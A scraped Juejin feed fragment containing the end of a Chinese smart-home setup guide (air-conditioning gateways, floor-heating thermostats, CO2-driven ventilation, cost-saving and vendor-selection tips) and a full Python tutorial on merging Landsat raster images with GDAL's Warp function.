<li><strong>窗帘电机</strong>：这是提升幸福感性价比最高的产品，没有之一。早晨被阳光叫醒的感觉，比闹钟强一万倍。（请注意搭配睡衣）</li>
<li><strong>空调</strong>：
<ul>
<li><strong>中央空调</strong>：<strong>拒绝原厂昂贵的智控模组！</strong> 推荐使用 <strong>VRF空调网关</strong>（自购约几百元，问清楚卖家兼容的型号），接在内机线上，直接完美接入米家/HomeKit。优势是<strong>双向反馈</strong>——你能看到它现在到底开了没、多少度，比红外发射器那种“盲发指令”稳一万倍。</li>
<li><strong>挂机/柜机</strong>：几十块钱的 <strong>空调伴侣（插座版）</strong> 是神器。不仅能红外控制，还能<strong>检测实时功率</strong>。极客用法：通过功率判断空调是否真的启动了，从而执行下一步逻辑，避免红外指令丢失造成的逻辑死循环。</li>
</ul>
</li>
<li><strong>地暖</strong>：
<ul>
<li>核心在于 <strong>温控面板</strong>。不要去动分集水器那种复杂的阀门，直接把墙上的传统温控器替换为支持 Zigbee/Wi-Fi 的智能温控面板（注意区分水暖/电暖接线）。</li>
<li><strong>价值</strong>：不在于远程开关，而在于<strong>分时段恒温</strong>。比如白天家中无人自动降至18度节能，下班前一小时自动升至22度。</li>
</ul>
</li>
<li><strong>新风</strong>：
<ul>
<li><strong>痛点</strong>：大多数新风机自带的“智能”都很鸡肋，因为它测的是机器内部或回风口的空气，不代表你床头的空气质量。</li>
<li><strong>极客方案</strong>：<strong>新风机常开（或者接智能插座） + 独立空气检测仪</strong>。</li>
<li><strong>联动逻辑</strong>：当卧室二氧化碳浓度高时，自动开启新风/调大风量；当二氧化碳浓度低时，低速运行或关闭。这才是真正的“为了健康呼吸”。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-14">3. 避坑指南</h3>
<ul>
<li>❌ <strong>带大屏的冰箱</strong>：纯属伪需求，在冰箱上刷抖音？</li>
<li>❌ <strong>必须联网才能用的设备</strong>：家电尽量买“愚蠢”但性能好的，通过<strong>智能插座</strong>或<strong>红外遥控器</strong>让它们变聪明即可。（我买过WIFI协议的智能灯，还不支持凌动，体验下来一言难尽）</li>
</ul>
<h2 data-id="heading-15"><strong>七、 场景应用：从“控制”到“服务”</strong></h2>
<p>不要再问“嘿 Siri，打开客厅灯”了，这很麻烦。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f272ee3c59754608a09364759e2d71c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5aCC56y6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527218&amp;x-signature=YWYgZAoRm6s8pgLKqFLYze09%2BvA%3D" alt="image-20260118202452683.png" loading="lazy"/></p>
<h3 data-id="heading-16">1. 灯光系统：光环境</h3>
<p>半夜上厕所，系统检测到有人下床（人体传感器），时间是凌晨3点（条件），自动开启走廊地灯，亮度 10%（执行）。这叫服务。如果是吸顶灯全开把你亮瞎，那叫事故。</p>
<h3 data-id="heading-17">2. 安防系统</h3>
<p>离家模式启动后，如果门窗被打开，立刻警报并推送手机，同时联动摄像头录像。漏水传感器检测到水浸，机械臂自动关闭水阀然后警报推送手机。</p>
<h3 data-id="heading-18">3. 环境系统</h3>
<p>恒温恒湿，甚至根据 CO2 浓度自动开启新风。你不需要知道今天多少度，你只需要觉得“舒服”。</p>
<h3 data-id="heading-19">4. 影音娱乐</h3>
<p>一句“我要看电影”，窗帘闭合、灯光渐暗、投影/电视打开、音响就位。</p>
<h2 data-id="heading-20"><strong>八、 如何省钱：极客的抠门智慧</strong></h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/117db6f724bb4f3b958ee12b3edfb40a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5aCC56y6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527218&amp;x-signature=Vjoi%2F1BmpFSWDATX0pPkdijYsrg%3D" alt="image-20260118203246817.png" loading="lazy"/></p>
<ol>
<li><strong>不要一次性买全</strong>：先从一个房间（如客厅）开始试点。智能家居是养成系游戏，不是装修工程。</li>
<li><strong>混搭大法</strong>：核心设备（网关、传感器、主开关）买大牌（如绿米、领普、Yeelight），外围设备（灯带、插座）可以在 1688 或平替品牌中找。</li>
<li><strong>旧物利用</strong>：退役的 iPad 上墙做中控屏（HomeKit 仪表盘），旧手机装个 App 做监控摄像头、废弃的MacBookAir合上盖子做服务器。</li>
<li><strong>预留、预留、预留</strong>：扩展性是王道，比如插座位、网线位、上下水等，虽然暂时没有需求，但如果是新装修，建议在合适的位置预留足够的扩展。
<ol>
<li>窗帘旁边：插座</li>
<li>厨房吊顶内：网线和插座</li>
<li>马桶旁边：带盖子的插座</li>
<li>阳台或三分离水池开放的洗手间：盆下的上下水管、插座</li>
<li>可以跟设计师探讨，一般情况，常见的智能设备预留位，他们都会有一定经验</li>
</ol>
</li>
<li><strong>找“全屋智能服务商”的防坑指南（如果不想自己动手）</strong>
<ul>
<li>如果你有预算但没时间折腾，想找服务商，请务必警惕“套餐陷阱”。</li>
<li><strong>避坑核心1：拒绝“只管装不管调”</strong>
<ul>
<li>智能家居的灵魂是<strong>逻辑配置</strong>，不是拧螺丝。如果服务商只给你列设备清单（多少个开关、多少个电机），却说不清楚具体的自动化场景设计，大概率是卖硬件的二道贩子。</li>
<li>要求：问他们根据你日常生活的动线，会设计哪些智能化场景，每个智能场景是如何实现的。</li>
</ul>
</li>
<li><strong>避坑核心2：账号所有权（极其重要！）</strong>
<ul>
<li>某些不良服务商会把设备绑定在他们的企业账号下，你只是个“使用者”。一旦你想改个名字、换个逻辑，还得求他们上门（顺便收你点服务费）。</li>
<li><strong>要求</strong>：必须交付<strong>超级管理员权限</strong>，设备必须绑定在你自己的账号上。</li>
</ul>
</li>
<li><strong>避坑核心3：考察“断网能力”</strong>
<ul>
<li>问销售：“如果家里断网了，或者路由器坏了，这些开关还能控制灯吗？传感器还能自动开灯吗？”</li>
<li>如果对方支支吾吾，或者推荐全屋 WiFi 方案，<strong>走</strong>。合格的全屋智能必须基于 Zigbee/PLC/蓝牙Mesh 等具备<strong>本地化边缘计算</strong>能力的协议，搭配智能网关来实现断网“兜底”。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 data-id="heading-21"><strong>九、 结语：自动化的尽头是“无感”</strong></h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/523b67d0c7ae475aa0f48dc00d78b961~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5aCC56y6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527218&amp;x-signature=AoEOxKrsW9aiAO0i9p7oZPWGo68%3D" alt="image-20260118203444426.png" loading="lazy"/>
追求本地控制，不仅仅是为了隐私，更是为了毫秒级的响应速度。你所到之处，智能场景均如你所想，没有任何延迟，这才是科技的性感之处。</p>
<p><strong>最好的智能家居，是你感觉不到它的存在。</strong></p>
<p>不要为了展示智能而强行设置复杂的语音指令，那是给客人表演用的。让房子像一个沉默的老管家，润物细无声地服务你的生活，才是我们折腾的终极意义。</p>
<hr/>
<p>后续会针对智能家居相关发布系列文章, 如有兴趣可点击关注</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GDAL 实现影像合并]]></title>    <link>https://juejin.cn/post/7597317683051364361</link>    <guid>https://juejin.cn/post/7597317683051364361</guid>    <pubDate>2026-01-20T15:42:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597317683051364361" data-draft-id="7597266141912711214" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GDAL 实现影像合并"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-20T15:42:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GIS之路"/> <meta itemprop="url" content="https://juejin.cn/user/4346787284915481"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GDAL 实现影像合并
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4346787284915481/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GIS之路
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:42:29.000Z" title="Tue Jan 20 2026 15:42:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">^ 关注我，带你一起学GIS ^</h2>
<h2 data-id="heading-1">前言</h2>
<blockquote>
<p>❝</p>
<p>GDAL作为地理空间数据处理的核心工具，其影像合并功能为多源栅格数据的集成与分析提供了高效、灵活的解决方案。无论是遥感影像镶嵌、地图瓦片拼接，还是时间序列数据的融合，该功能能够帮助用户将分散的影像片段整合为具有统一地理参考和连贯信息表达的完整数据集，为后续的空间分析、可视化及应用构建可靠的数据基础。</p>
</blockquote>
<p>由于本文由一些前置知识，在正式开始之前，需要你掌握一定的<code>Python</code>开发基础和GDAL的基本概念。在之前的文章中讲解了如何使用<code>GDAL</code>或者<code>ogr2ogr</code>工具将<code>txt</code>以及<code>csv</code>文本数据转换为<code>Shp</code>格式，可以作为基础入门学习。本篇教程在之前一系列文章的基础上讲解如何使用<strong>GDAL 实现影像合并</strong>。</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FQtb_BJw91nKrFMeoa7WcxA" target="_blank" title="https://mp.weixin.qq.com/s/Qtb_BJw91nKrFMeoa7WcxA" ref="nofollow noopener noreferrer">GDAL 简介</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FFLWfZItLj24JYicQEX-PbQ" target="_blank" title="https://mp.weixin.qq.com/s/FLWfZItLj24JYicQEX-PbQ" ref="nofollow noopener noreferrer">GDAL 下载安装</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fu0539e3CM2q4Y3MbMxxZKQ" target="_blank" title="https://mp.weixin.qq.com/s/u0539e3CM2q4Y3MbMxxZKQ" ref="nofollow noopener noreferrer">GDAL 开发起步</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F0DGoC0oFHizJbweBnEvI-g" target="_blank" title="https://mp.weixin.qq.com/s/0DGoC0oFHizJbweBnEvI-g" ref="nofollow noopener noreferrer">GDAL 实现 GIS 数据读取转换（全）</a></li>
</ul>
<p>如果你还没有看过，建议从以上内容开始。</p>
<h2 data-id="heading-2">1. 开发环境</h2>
<p>本文使用如下开发环境，以供参考。</p>
<p>时间：<code>2025年</code></p>
<p>系统：<code>Windows 11</code></p>
<p>Python：<code>3.11.7</code></p>
<p>GDAL：<code>3.11.1</code></p>
<h2 data-id="heading-3">2. 数据准备</h2>
<p>俗话说巧妇难为无米之炊，数据就是软件的基石，没有数据，再美好的设想都是空中楼阁。因此，第一步需要下载遥感影像数据。</p>
<p>但是，影像数据在哪里下载呢？别着急，本文都给你整理好了。</p>
<p>数据下载可参考文章：<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F5c_J7f0xkUXEv7_z0eNweQ" target="_blank" title="https://mp.weixin.qq.com/s/5c_J7f0xkUXEv7_z0eNweQ" ref="nofollow noopener noreferrer">GIS 影像数据源介绍</a></strong></p>
<p>如下，这是我在【地理空间数据云】平台下载的<code>landsat8</code>遥感影像。<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/445289344a844e10aae8dc47b01dd5c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528548&amp;x-signature=iyODsToTtGQY3kqIe%2BXwcsGpflw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">3. 导入依赖</h2>
<p><code>GeoTIFF</code>作为一种栅格数据格式，可以使用<code>GDAL</code>直接进行处理，以实现影像数据的合并操作。影像合并涉及到大量数学运算，所以还需要导入<code>numpy</code>模块进行处理。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">from</span> osgeo <span class="hljs-keyword">import</span> gdal
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
</code></pre>
<p>如果你没有安装<code>numpy</code>模块的话，可执行命令<code>pip install numpy</code>进行安装。</p>
<h2 data-id="heading-5">4. 影像合并</h2>
<p>定义一个方法<code>merge_raster(input_files, output_file, target_resolution=None)</code>用于实现栅格数据的合并。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
说明：GDAL 影像合并
参数：
    -input_files：输入合并的影像文件列表
    -output_file：输出影像文件
    -target_resolution：影像合并分辨率
"""</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">merge_raster</span>(<span class="hljs-params">input_files, output_file, target_resolution=<span class="hljs-literal">None</span></span>):
</code></pre>
<p>在获取到影像数据后，需要对数据范围进行合并。</p>
<pre><code class="hljs language-ini" lang="ini">"""
需要合并图像尺寸后进行输出
"""

<span class="hljs-comment"># 获取所有影像的边界和分辨率</span>
min_x, max_x, min_y, <span class="hljs-attr">max_y</span> = float(<span class="hljs-string">'inf'</span>), -float(<span class="hljs-string">'inf'</span>), float(<span class="hljs-string">'inf'</span>), -float(<span class="hljs-string">'inf'</span>)
res_x, <span class="hljs-attr">res_y</span> = None, None

for file in input_files:
    <span class="hljs-comment"># 打开数据集</span>
    <span class="hljs-attr">ds</span> = gdal.Open(file)
    <span class="hljs-comment"># 获取地理变换信息</span>
    <span class="hljs-attr">gt</span> = ds.GetGeoTransform()

    <span class="hljs-comment"># 获取行、列数</span>
    <span class="hljs-attr">x_size</span> = ds.RasterXSize
    <span class="hljs-attr">y_size</span> = ds.RasterYSize

    <span class="hljs-comment"># 计算实际边界</span>
    <span class="hljs-attr">x_min</span> = gt[<span class="hljs-number">0</span>]
    <span class="hljs-attr">y_max</span> = gt[<span class="hljs-number">3</span>]
    <span class="hljs-attr">x_max</span> = gt[<span class="hljs-number">0</span>] + x_size * gt[<span class="hljs-number">1</span>]
    <span class="hljs-attr">y_min</span> = gt[<span class="hljs-number">3</span>] + y_size * gt[<span class="hljs-number">5</span>]

    <span class="hljs-attr">min_x</span> = min(min_x, x_min)
    <span class="hljs-attr">max_x</span> = max(max_x, x_max)
    <span class="hljs-attr">min_y</span> = min(min_y, y_min)
    <span class="hljs-attr">max_y</span> = max(max_y, y_max)

    if res_x is None or abs(gt<span class="hljs-section">[1]</span>) &lt; abs(res_x):
        <span class="hljs-attr">res_x</span> = abs(gt[<span class="hljs-number">1</span>])
        <span class="hljs-attr">res_y</span> = abs(gt[<span class="hljs-number">5</span>])

    <span class="hljs-comment"># 关闭数据源</span>
    <span class="hljs-attr">ds</span> = None
</code></pre>
<p>计算影像合并分辨率。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 使用目标分辨率或计算出的分辨率</span>
if target_resolution:
    <span class="hljs-attr">res_x</span> = res_y = target_resolution
</code></pre>
<p>获取影像大小，输出合并影像的总行数和总列数。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 计算输出尺寸</span>
<span class="hljs-attr">out_cols</span> = int((max_x - min_x) / res_x + <span class="hljs-number">0.5</span>)
<span class="hljs-attr">out_rows</span> = int((max_y - min_y) / res_y + <span class="hljs-number">0.5</span>)
</code></pre>
<p>调用<code>gdal</code>对象方法<code>Warp</code>进行影像合并，该函数第一个参数<code>destNameOrDestDS</code> 为输出数据集名称或者数据源，第二个参数<code>srcDSOrSrcDSTab</code>为源数据，第三个参数<code>options</code>为可选项描述，用于定义合并影像信息。<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/438f9d8e123b475883cc9d6c536504d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528548&amp;x-signature=xw0QqRO8Rx1O%2FfZ5%2Bb6gfBIbauE%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 设置Warp参数</span>
<span class="hljs-attr">warp_options</span> = gdal.WarpOptions(
    <span class="hljs-attr">format</span>=<span class="hljs-string">'GTiff'</span>,
    <span class="hljs-attr">outputBounds</span>=[min_x, min_y, max_x, max_y],
    <span class="hljs-attr">xRes</span>=res_x,
    <span class="hljs-attr">yRes</span>=res_y,
    <span class="hljs-attr">resampleAlg</span>=<span class="hljs-string">'bilinear'</span>,  <span class="hljs-comment"># 根据需要选择：near, bilinear, cubic, lanczos等</span>
    <span class="hljs-attr">dstNodata</span>=<span class="hljs-number">0</span>,
    <span class="hljs-attr">targetAlignedPixels</span>=<span class="hljs-literal">True</span>,  <span class="hljs-comment"># 确保像素对齐</span>
    <span class="hljs-attr">multithread</span>=<span class="hljs-literal">True</span>,
    <span class="hljs-attr">creationOptions</span>=[<span class="hljs-string">'COMPRESS=LZW'</span>, <span class="hljs-string">'TILED=YES'</span>, <span class="hljs-string">'BIGTIFF=IF_SAFER'</span>]
)

<span class="hljs-comment"># 执行合并</span>
gdal.Warp(output_file, input_files, <span class="hljs-attr">options</span>=warp_options)
</code></pre>
<p>在<code>main</code>函数中调用合并方法。</p>
<pre><code class="hljs language-ini" lang="ini">if <span class="hljs-attr">__name__</span> == <span class="hljs-string">"__main__"</span>:

    <span class="hljs-comment"># 输入影像文件</span>
    <span class="hljs-attr">input_files</span> = [ 
        <span class="hljs-string">"E:\ArcGIS\bandmerge\lc8_band_432.tif"</span>,
        <span class="hljs-string">"E:\ArcGIS\bandmerge\lc8_band_432_d.tif"</span>
    ]
    <span class="hljs-comment"># 输出影像文件</span>
    <span class="hljs-attr">output_file</span> = <span class="hljs-string">"E:\ArcGIS\bandmerge\merge_result.tif"</span>

    merge_raster(input_files, output_file, <span class="hljs-attr">target_resolution</span>=<span class="hljs-number">10</span>)
</code></pre>
<p><strong>图片效果</strong></p>
<p><strong><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cab37a47d3fb48ab837b7db149980e8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528548&amp;x-signature=ZqtFz8W%2BkOHmj%2BURSmkLAzxuj6k%3D" alt="" loading="lazy"/></strong></p>
<p><strong><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9da082e8c6474b79ba14429252362328~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528548&amp;x-signature=KaieS37Z3vwN80SaYJYmYyFF8%2B8%3D" alt="" loading="lazy"/></strong></p>
<blockquote>
<p>❝</p>
<p>OpenLayers示例数据下载，请在公众号后台回复：<strong>vector</strong></p>
<p>全国信息化工程师－GIS 应用水平考试资料，请在公众号后台回复：<strong>GIS考试</strong></p>
</blockquote>
<blockquote>
<p>❝</p>
<p><em><strong>GIS之路</strong></em> 公众号已经接入了<strong>智能</strong> <strong>助手</strong>，可以在对话框进行提问，也可以直接搜索历史文章进行查看。</p>
</blockquote>
<p>都看到这了，不要忘记<em><strong>点赞、收藏</strong></em> <strong>+</strong> <em><strong>关注</strong></em> 哦 <strong>！</strong></p>
<p>本号不定时更新有关 <em><strong>GIS开发</strong></em> 相关内容，<em><strong>欢迎关注 <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60a20f016616439b82c168439d9fab7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528548&amp;x-signature=jkVMN2FzQJpnlKmcNd0OlEZsMK0%3D" alt="" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/acf6e76429534fa4a2938e323ef6f6f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528548&amp;x-signature=UhlMt9t9CFE1ODhQuQMQWdw8Mmo%3D" alt="" loading="lazy"/></strong></em></p>
<hr/>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2e4debb563c4619ad81009420a378c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528548&amp;x-signature=X7EjrBYbPUsTFs5TzOlZ8aqeBAg%3D" alt="" loading="lazy"/></p>
<p>   <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/947660caa98d4dccaf370016c96a1e54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769528548&amp;x-signature=mpYbJ6l211G1xc3aYk84ciJQq7M%3D" alt="" loading="lazy"/> </p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwOTEzNjI5NQ%3D%3D%26mid%3D2247487953%26idx%3D1%26sn%3D0b2d5aeefdb290583cf8cdd82f3c2077%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwOTEzNjI5NQ==&amp;mid=2247487953&amp;idx=1&amp;sn=0b2d5aeefdb290583cf8cdd82f3c2077&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">GeoTools 开发合集（全）</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwOTEzNjI5NQ%3D%3D%26mid%3D2247487119%26idx%3D1%26sn%3Dc313efa84c27bf933ef2f2a47991ef2d%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwOTEzNjI5NQ==&amp;mid=2247487119&amp;idx=1&amp;sn=c313efa84c27bf933ef2f2a47991ef2d&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">OpenLayers 开发合集</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FGynyIuYw2eRJ4y6gZ8oSLQ" target="_blank" title="https://mp.weixin.qq.com/s/GynyIuYw2eRJ4y6gZ8oSLQ" ref="nofollow noopener noreferrer">小小声说一下GDAL的官方API接口</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FlEqKlTbHKzJ25XsIX6CBuw" target="_blank" title="https://mp.weixin.qq.com/s/lEqKlTbHKzJ25XsIX6CBuw" ref="nofollow noopener noreferrer">《云南省加快构建现代化产业体系推进产业强省建设行动计划》发布</a></p>
